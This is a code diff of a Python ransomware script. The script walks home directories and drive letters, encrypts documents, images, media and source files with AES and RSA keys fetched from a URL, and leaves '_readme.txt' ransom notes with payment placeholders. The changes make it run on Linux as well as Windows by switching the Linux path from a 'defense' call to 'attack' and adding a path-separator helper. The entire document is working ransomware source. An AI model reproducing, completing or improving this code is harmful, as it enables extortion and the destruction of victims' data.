@@ -3,23 +3,14 @@ import random
 import base64
 import requests as req
 from time import sleep
+from sys import platform
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-# On Local PC
-#url_web = 'Pub Folder'
-#url_list = [List Key]
-#key_c = random.choice(url_list)
-#ext = '.' + key_c.split('.')[1]
-#URL_KEY = key_c
-#pbk = open(URL_KEY).read()
-#print(pbk)
-#lcx = key_c.split('.pem')[0]
-
 # On Website
 url_web = "YOUR URL"
-url_list = [LIST KEY]
+url_list = ["LIST KEY"]
 key_c = random.choice(url_list)
 ext = '.' + key_c.split('.')[1]
 URL_KEY = url_web + key_c
@@ -34,6 +25,11 @@ BUSD_ADDRESS :
 '''
 CONTACT = '''YOUR CONTACT'''
 
+def splacer():
+    if(platform == 'win32'):
+        return '\\'
+    elif(platform == 'linux'):
+        return '/'
 
 def encrypt(filename):
     with open(filename, "rb") as file:
@@ -54,7 +50,7 @@ def encrypt(filename):
 
 def attack(target):
 
-    fl = ".c",".dll",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"
+    fl = ".c",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"
 
     for p, d, f in os.walk(target):
         for name in f:
@@ -83,9 +79,9 @@ def attack(target):
                 ''' + CONTACT + '''
                 Thank You For Your Attention (*v*)'''
 
-                with open(p + '\\_readme.txt', 'w') as f:
+                with open(p + splacer() + '_readme.txt', 'w') as f:
                     f.writelines(lines)
-                with open(p + '\\.license','w') as l:
+                with open(p + splacer() +'.license','w') as l:
                     l.write(lcx)
             except PermissionError:
                 problem = "Tidak bisa di isi file"
@@ -94,12 +90,12 @@ if __name__ == '__main__':
     if (platform == 'win32'):
         t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
         for i in range(len(t)):
-            attack(t[i])
+            attack(t[i] + splacer())
             sleep(1800)
     elif (platform == 'linux'):
         t = ['~']
         for i in range(len(t)):
-            defense(t[i])
+            attack(t[i] + splacer())
             sleep(1800)
     else:
         print('I will better')
